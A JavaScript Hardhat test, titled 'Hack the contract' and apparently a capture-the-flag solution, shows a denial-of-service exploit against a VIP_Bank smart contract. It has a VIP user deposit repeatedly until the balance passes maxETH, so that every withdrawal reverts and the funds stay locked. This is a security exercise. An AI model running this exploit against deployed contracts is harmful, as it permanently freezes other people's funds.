const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("Hack the contract", function () {
  async function deployment() {
    const signers = await hre.ethers.getSigners();
    const vipUser = await signers[1];
    const manager = await signers[0];

    const VIPBank = await hre.ethers.getContractFactory("VIP_Bank");
    const vipBank = await VIPBank.deploy();
    await vipBank.deployed();

    return { signers, manager, vipBank, vipUser };
  }

  describe("Deployment", function () {
    it("Lock the contract", async function () {
      const { manager, vipBank, vipUser } = await loadFixture(deployment);
      const maxETH = "50000000000000000";

      // The manager allows the signers[1] to be a VIP user.
      await vipBank.connect(manager).addVIP(vipUser.address);

      // The VIP user deposits 0.05 ETH to the VIP bank contract, until the total balance of the contract is higher to 0.5ETH.
      // This will lock the contract for ever, as one requirement for calling the function withdrawn is that the contract balance is lower than the maxETH.
      while ((await vipBank.contractBalance()) <= (await vipBank.maxETH())) {
        await vipBank.connect(vipUser).deposit({ value: maxETH });
      }

      expect(vipBank.connect(vipUser).withdraw(maxETH)).to.be.reverted;

      const balanceLocked = await vipBank.contractBalance();

      console.log(
        `The contract is locked for ever, with a total balance of: ${await ethers.utils.formatEther(
          balanceLocked
        )}`
      );
    });
  });
});
